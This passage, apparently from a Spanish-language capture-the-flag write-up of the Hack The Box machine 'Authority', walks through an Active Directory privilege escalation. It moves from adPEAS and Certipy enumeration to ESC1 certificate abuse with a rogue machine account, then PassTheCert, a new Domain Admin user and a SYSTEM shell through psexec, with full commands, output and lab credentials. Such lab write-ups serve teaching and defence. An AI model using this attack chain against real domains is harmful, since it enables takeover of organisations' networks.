Date of Creation:			04/24/2023 01:56:26
DistinguishedName:			CN=authority-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
NTAuthCertificates:			True
Available Templates:			CorpVPN
					authorityLDAPS
					DirectoryEmailReplication
					DomainControllerAuthentication
					KerberosAuthentication
					EFSRecovery
					EFS
					DomainController
					WebServer
					Machine
					User
					SubCA
					Administrator

[?] +++++ Searching for Vulnerable Certificate Templates +++++
adPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy

[?] +++++ Checking Template 'CorpVPN' +++++
[!] Template 'CorpVPN' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
[+] Identity 'HTB\Domain Computers' has enrollment rights for template 'CorpVPN'
Template Name:				CorpVPN
Template distinguishedname:		CN=CorpVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
Date of Creation:			03/24/2023 23:48:09
[+] Extended Key Usage:			Encrypting File System, Secure E-mail, Client Authentication, Document Signing, 1.3.6.1.5.5.8.2.2, IP Security User, KDC Authentication
EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
[!] CertificateNameFlag:		ENROLLEE_SUPPLIES_SUBJECT
[+] Enrollment allowed for:		HTB\Domain Computers

[?] +++++ Checking Template 'authorityLDAPS' +++++

[?] +++++ Checking Template 'DirectoryEmailReplication' +++++

[?] +++++ Checking Template 'DomainControllerAuthentication' +++++

[?] +++++ Checking Template 'KerberosAuthentication' +++++

[?] +++++ Checking Template 'EFSRecovery' +++++

[?] +++++ Checking Template 'EFS' +++++
[+] Identity 'HTB\Domain Users' has enrollment rights for template 'EFS'
Template Name:				EFS
Template distinguishedname:		CN=EFS,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
Date of Creation:			08/09/2022 23:05:58
Extended Key Usage:			Encrypting File System
EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
CertificateNameFlag:			SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
[+] Enrollment allowed for:		HTB\Domain Users

[?] +++++ Checking Template 'DomainController' +++++

[?] +++++ Checking Template 'WebServer' +++++
[!] Template 'WebServer' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
Template Name:				WebServer
Template distinguishedname:		CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
Date of Creation:			08/09/2022 23:05:58
Extended Key Usage:			Server Authentication
EnrollmentFlag:				0
[!] CertificateNameFlag:		ENROLLEE_SUPPLIES_SUBJECT

[?] +++++ Checking Template 'Machine' +++++
[+] Identity 'HTB\Domain Computers' has enrollment rights for template 'Machine'
Template Name:				Machine
Template distinguishedname:		CN=Machine,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
Date of Creation:			08/09/2022 23:05:58
[+] Extended Key Usage:			Client Authentication, Server Authentication
EnrollmentFlag:				AUTO_ENROLLMENT
CertificateNameFlag:			SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
[+] Enrollment allowed for:		HTB\Domain Computers

[?] +++++ Checking Template 'User' +++++
[+] Identity 'HTB\Domain Users' has enrollment rights for template 'User'
Template Name:				User
Template distinguishedname:		CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
Date of Creation:			08/09/2022 23:05:58
[+] Extended Key Usage:			Encrypting File System, Secure E-mail, Client Authentication
EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
CertificateNameFlag:			SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
[+] Enrollment allowed for:		HTB\Domain Users

[?] +++++ Checking Template 'SubCA' +++++
[!] Template 'SubCA' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
Template Name:				SubCA
Template distinguishedname:		CN=SubCA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
Date of Creation:			08/09/2022 23:05:58
EnrollmentFlag:				0
[!] CertificateNameFlag:		ENROLLEE_SUPPLIES_SUBJECT

[?] +++++ Checking Template 'Administrator' +++++

[?] +++++ Searching for Credentials Exposure +++++

[?] +++++ Searching for ASREProastable User +++++

[?] +++++ Searching for Kerberoastable User +++++

[?] +++++ Searching for User with 'Linux/Unix Password' attribute +++++

[?] +++++ Searching for Computer with enabled and readable Microsoft LAPS legacy attribute +++++

[?] +++++ Searching for Computer with enabled and readable Windows LAPS native attribute +++++

[?] +++++ Searching for Group Managed Service Account (gMSA) +++++

[?] +++++ Searching for Credentials in Group Policy Files +++++

[?] +++++ Searching for Sensitive Information in SYSVOL/NETLOGON Share +++++

[?] +++++ Searching for Delegation Issues +++++

[?] +++++ Searching for Computer with Unconstrained Delegation Rights +++++

[?] +++++ Searching for Computer with Constrained Delegation Rights +++++

[?] +++++ Searching for Computer with Resource-Based Constrained Delegation Rights +++++

[?] +++++ Searching for User with Constrained Delegation Rights +++++

[?] +++++ Searching for User with Resource-Based Constrained Delegation Rights +++++

[?] +++++ Starting Account Enumeration +++++

[?] +++++ Searching for Azure AD Connect +++++

[?] +++++ Searching for Users in High Privileged Groups +++++
[+] Found members in group 'BUILTIN\Administrators':
GroupName:				Enterprise Admins
distinguishedName:			CN=Enterprise Admins,CN=Users,DC=authority,DC=htb
objectSid:				S-1-5-21-622327497-3269355298-2248959698-519
[+] description:			Designated administrators of the enterprise
 
GroupName:				Domain Admins
distinguishedName:			CN=Domain Admins,CN=Users,DC=authority,DC=htb
objectSid:				S-1-5-21-622327497-3269355298-2248959698-512
[+] description:			Designated administrators of the domain
 
sAMAccountName:				Administrator
distinguishedName:			CN=Administrator,CN=Users,DC=authority,DC=htb
objectSid:				S-1-5-21-622327497-3269355298-2248959698-500
memberOf:				CN=Group Policy Creator Owners,CN=Users,DC=authority,DC=htb
					CN=Domain Admins,CN=Users,DC=authority,DC=htb
					CN=Enterprise Admins,CN=Users,DC=authority,DC=htb
					CN=Schema Admins,CN=Users,DC=authority,DC=htb
					CN=Administrators,CN=Builtin,DC=authority,DC=htb
[+] description:			Built-in account for administering the computer/domain
pwdLastSet:				07/05/2023 10:35:34
lastLogonTimestamp:			10/09/2024 08:08:30
userAccountControl:			NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:				This identity is or was member of a high privileged admin group
 
[+] Found members in group 'HTB\Domain Admins':
sAMAccountName:				Administrator
distinguishedName:			CN=Administrator,CN=Users,DC=authority,DC=htb
objectSid:				S-1-5-21-622327497-3269355298-2248959698-500
memberOf:				CN=Group Policy Creator Owners,CN=Users,DC=authority,DC=htb
					CN=Domain Admins,CN=Users,DC=authority,DC=htb
					CN=Enterprise Admins,CN=Users,DC=authority,DC=htb
					CN=Schema Admins,CN=Users,DC=authority,DC=htb
					CN=Administrators,CN=Builtin,DC=authority,DC=htb
[+] description:			Built-in account for administering the computer/domain
pwdLastSet:				07/05/2023 10:35:34
lastLogonTimestamp:			10/09/2024 08:08:30
userAccountControl:			NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:				This identity is or was member of a high privileged admin group
 
[+] Found members in group 'HTB\Enterprise Admins':
sAMAccountName:				Administrator
distinguishedName:			CN=Administrator,CN=Users,DC=authority,DC=htb
objectSid:				S-1-5-21-622327497-3269355298-2248959698-500
memberOf:				CN=Group Policy Creator Owners,CN=Users,DC=authority,DC=htb
					CN=Domain Admins,CN=Users,DC=authority,DC=htb
					CN=Enterprise Admins,CN=Users,DC=authority,DC=htb
					CN=Schema Admins,CN=Users,DC=authority,DC=htb
					CN=Administrators,CN=Builtin,DC=authority,DC=htb
[+] description:			Built-in account for administering the computer/domain
pwdLastSet:				07/05/2023 10:35:34
lastLogonTimestamp:			10/09/2024 08:08:30
userAccountControl:			NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:				This identity is or was member of a high privileged admin group
 
[+] Found members in group 'HTB\Group Policy Creator Owners':
sAMAccountName:				Administrator
distinguishedName:			CN=Administrator,CN=Users,DC=authority,DC=htb
objectSid:				S-1-5-21-622327497-3269355298-2248959698-500
memberOf:				CN=Group Policy Creator Owners,CN=Users,DC=authority,DC=htb
					CN=Domain Admins,CN=Users,DC=authority,DC=htb
					CN=Enterprise Admins,CN=Users,DC=authority,DC=htb
					CN=Schema Admins,CN=Users,DC=authority,DC=htb
					CN=Administrators,CN=Builtin,DC=authority,DC=htb
[+] description:			Built-in account for administering the computer/domain
pwdLastSet:				07/05/2023 10:35:34
lastLogonTimestamp:			10/09/2024 08:08:30
userAccountControl:			NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:				This identity is or was member of a high privileged admin group
 
[+] Found members in group 'BUILTIN\Remote Management Users':
sAMAccountName:				svc_ldap
distinguishedName:			CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
objectSid:				S-1-5-21-622327497-3269355298-2248959698-1601
memberOf:				CN=Remote Management Users,CN=Builtin,DC=authority,DC=htb
pwdLastSet:				08/10/2022 21:29:31
lastLogonTimestamp:			10/09/2024 08:44:44
userAccountControl:			NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:				This identity is or was member of a high privileged admin group
 
[+] Found members in group 'HTB\Cert Publishers':
sAMAccountName:				authority$
distinguishedName:			CN=authority,OU=Domain Controllers,DC=authority,DC=htb
objectSid:				S-1-5-21-622327497-3269355298-2248959698-1000
operatingsystem:			Windows Server 2019 Standard
memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=htb
					CN=Cert Publishers,CN=Users,DC=authority,DC=htb
pwdLastSet:				10/09/2024 08:08:10
lastLogonTimestamp:			10/09/2024 08:08:30
[+] userAccountControl:			SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
 

[?] +++++ Searching for High Privileged Users with a password older 5 years +++++

[?] +++++ Searching for High Privileged User which may not require a Password +++++

[?] +++++ Starting Computer Enumeration +++++

[?] +++++ Searching for Domain Controllers +++++
[+] Found Domain Controller 'authority$':
sAMAccountName:				authority$
distinguishedName:			CN=authority,OU=Domain Controllers,DC=authority,DC=htb
objectSid:				S-1-5-21-622327497-3269355298-2248959698-1000
operatingsystem:			Windows Server 2019 Standard
memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=htb
					CN=Cert Publishers,CN=Users,DC=authority,DC=htb
pwdLastSet:				10/09/2024 08:08:10
lastLogonTimestamp:			10/09/2024 08:08:30
[+] userAccountControl:			SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
 

[?] +++++ Searching for Exchange Servers +++++

[?] +++++ Searching for ADCS Servers +++++
[+] Found ADCS Server 'authority$':
sAMAccountName:				authority$
distinguishedName:			CN=authority,OU=Domain Controllers,DC=authority,DC=htb
objectSid:				S-1-5-21-622327497-3269355298-2248959698-1000
operatingsystem:			Windows Server 2019 Standard
memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=htb
					CN=Cert Publishers,CN=Users,DC=authority,DC=htb
pwdLastSet:				10/09/2024 08:08:10
lastLogonTimestamp:			10/09/2024 08:08:30
[+] userAccountControl:			SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
 

[?] +++++ Searching for Outdated Operating Systems +++++

[?] +++++ Searching for Detailed Active Directory Information with BloodHound +++++
```

Nos detecta varias `templates` y nos recomienda usar `Certipy` [https://github.com/ly4k/Certipy.git](https://github.com/ly4k/Certipy.git) o `Certify` [https://github.com/GhostPack/Certify.git](https://github.com/GhostPack/Certify.git), en este caso voy a usar `Certipy` porque me parece más cómodo

```
# pip3 install certipy-ad
```

Ejecutamos `certipy` y nos encuentra la vulnerabiliad `ESC1`

```
# certipy-ad find -u svc_ldap@authority.htb -p ''lDaP_1n_th3_cle4r!'' -dc-ip 10.129.229.56 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'authority-CA' via CSRA
[!] Got error while trying to get CA configuration for 'authority-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'authority-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'authority-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : authority-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=authority-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : authority.HTB\Administrators
      Access Rights
        ManageCertificates              : authority.HTB\Administrators
                                          authority.HTB\Domain Admins
                                          authority.HTB\Enterprise Admins
        ManageCa                        : authority.HTB\Administrators
                                          authority.HTB\Domain Admins
                                          authority.HTB\Enterprise Admins
        Enroll                          : authority.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : authority-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : authority.HTB\Domain Computers
                                          authority.HTB\Domain Admins
                                          authority.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : authority.HTB\Administrator
        Write Owner Principals          : authority.HTB\Domain Admins
                                          authority.HTB\Enterprise Admins
                                          authority.HTB\Administrator
        Write Dacl Principals           : authority.HTB\Domain Admins
                                          authority.HTB\Enterprise Admins
                                          authority.HTB\Administrator
        Write Property Principals       : authority.HTB\Domain Admins
                                          authority.HTB\Enterprise Admins
                                          authority.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'authority.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

Vemos que el dns es `authority.authority.htb` por lo tanto debemos añadirlo al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       kali-linux
10.129.229.56   authority.htb authority.authority.htb authority

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Observamos que como `usuario` no podemos `explotar` esta `vulnerabilidad`, debemos `crear` una `máquina` en el `dominio`, lo primero es `comprobar` si nuestro `usuario` puede `crearlas`, para ello usaremos un `módulo` de `netexec`. A esto se le llama `Machine Account Quota`, que es una configuración en `Active Directory` que determina cuántas `cuentas de máquina` (como las que se utilizan para unir computadoras a un `dominio`) puede crear un `usuario` específico. Por defecto, esta cuota es `10`, lo que significa que un usuario puede crear hasta `10 cuentas de máquina` en el dominio

```
# netexec ldap 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq

/usr/lib/python3/dist-packages/bloodhound/ad/utils.py:115: SyntaxWarning: invalid escape sequence '\-'
  xml_sid_rex = re.compile('<UserId>(S-[0-9\-]+)</UserId>')
SMB         10.129.229.56   445    authority        [*] Windows 10 / Server 2019 Build 17763 x64 (name:authority) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.229.56   636    authority        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.129.229.56   389    authority        [*] Getting the MachineAccountQuota
MAQ         10.129.229.56   389    authority        MachineAccountQuota: 10
```

Podemos `crear` una `máquina` en el equipo con este `comando`

```
# impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'TEST$' -computer-pass 'password'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account TEST$ with password password.
```

`Sincronizamos` nuestra `hora` con la hora de la máquina víctima

```
# sudo ntpdate 10.129.229.56 
2024-10-09 15:24:39.520870 (+0200) +14400.157112 +/- 0.021624 10.129.229.56 s1 no-leap
CLOCK: time stepped by 14400.157112
```

`ESC1` ocurre cuando una `plantilla` de `certificado` permite la `autenticación` de `cliente` y permite al solicitante proporcionar un `Nombre Alternativo del Sujeto (SAN)` arbitrario.
Para `ESC1`, podemos `solicitar` un `certificado` basado en la `plantilla` de `certificado vulnerable` y especificar un `UPN` o un `SAN DNS` arbitrario con los parámetros `-upn` y `-dns`, respectivamente

```
# certipy-ad req -u 'TEST$' -p 'password' -ca authority-CA -target authority.authority.htb -dc-ip 10.129.229.56 -dns authority.htb -template CorpVPN -upn Administrator@authority.htb  
Certipy v4.8.2 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence '\('
  "(0x[a-zA-Z0-9]+) \([-]?[0-9]+ ",
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with multiple identifications
    UPN: 'Administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

Ahora podemos intentar usar `Certipy` con este archivo de certificado `.pfx` para solicitar un `TGT` (Ticket Granting Ticket) de `Kerberos` como el `Administrador` del `dominio`. Si todo sale bien, la herramienta realizará una autenticación `Kerberos U2U` (User-to-User authentication) por nosotros y descifrará el `NT hash` del `PAC` (Privilege Attribute Certificate). Entonces podremos usar el `NT hash` para realizar un `pass-the-hash` y obtener acceso de administrador. Sin embargo, obtenemos un error `KDC_ERR_PADATA_TYPE_NOSUPP` (el `KDC` no tiene soporte para el tipo de `padata`). Algunas búsquedas nos llevan a esta publicación del blog, que explica que esto probablemente significa que el `Controlador` de `Dominio` objetivo no soporta `PKINIT` [https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)

```
# certipy-ad auth -pfx administrator_authority.pfx -dc-ip 10.129.229.56

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
> 0
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

Según el artículo anterior, es posible que podamos autenticarnos a través de algunos protocolos como `LDAP(S)`. Primero, dividamos el `administrator_authority` en el `certificado` y la `clave privada` utilizando los siguientes dos comandos

```
# certipy cert -pfx administrator.pfx -nokey -out cert.crt

# certipy cert -pfx administrator.pfx -nocert -out cert.key
```

Después de eso, utilizando `PassTheCert` [https://github.com/AlmondOffSec/PassTheCert.git](https://github.com/AlmondOffSec/PassTheCert.git), podemos obtener una `shell` como `Administrador` a través de `Schannel` contra `LDAP(S)`

```
# python3 passthecert.py -dc-ip 10.129.229.56 -crt cert.crt -key cert.key -domain authority.htb -port 636 -action ldap-shell
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands

# whoami
u:HTB\Administrator
```

`Creamos` un nuevo `usuario` y lo `agregamos` al grupo `Domain Admins`

```
# python3 passthecert.py -dc-ip 10.129.229.56 -crt cert.crt -key cert.key -domain authority.htb -port 636 -action ldap-shell
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands

# whoami
u:HTB\Administrator

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.

# add_user test
Attempting to create user in: %s CN=Users,DC=authority,DC=htb
Adding new user with username: test and password: ,J94rysf}$Ud|I; result: OK

# add_user_to_group test "Domain Admins"
Adding user: test to group Domain Admins result: OK
```

`Validamos` las `credenciales` del usuario

```
# netexec smb 10.129.229.56 -u test -p ',J94rysf}$Ud|I;'                 
SMB         10.129.229.56   445    authority        [*] Windows 10 / Server 2019 Build 17763 x64 (name:authority) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.56   445    authority        [+] authority.htb\test:,J94rysf}$Ud|I; (Pwn3d!)
```

Nos `conectamos` con `psexec` a la máquina víctima

```
# impacket-psexec 'authority.htb/test:,J94rysf}$Ud|I;@10.129.229.56'     
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.229.56.....
[*] Found writable share ADMIN$
[*] Uploading file tmihcXSZ.exe
[*] Opening SVCManager on 10.129.229.56.....
[*] Creating service OUtc on 10.129.229.56.....
[*] Starting service OUtc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
